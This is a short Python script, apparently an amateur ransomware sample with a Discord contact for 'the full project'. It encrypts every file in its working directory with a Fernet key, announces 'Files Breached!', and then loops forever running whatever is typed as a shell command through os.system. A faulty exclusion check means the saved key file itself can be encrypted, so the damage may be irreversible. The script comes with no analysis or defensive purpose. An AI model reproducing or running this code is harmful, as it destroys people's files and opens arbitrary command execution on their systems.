#for the full project contact me on discord Pynx#0001

import os
from cryptography.fernet import Fernet
#Try the following:
try:
    # DO THINGS
  print("")
except KeyboardInterrupt:
    # quit
    print("Tried to kill me?")
files = []

for file in os.listdir():
  if file =="main.py" or files =="thekey.txt" or files =="replit.nix":
    continue
  if os.path.isfile(file):
    files.append(file)

print("Files Breached!")
print("All files encrypted!")
print(files)
key = Fernet.generate_key()

with open("thekey.txt","wb") as thekey:
  thekey.write(key)

for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
  with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)

while True:
  u = input("")
  os.system('{}'.format(u))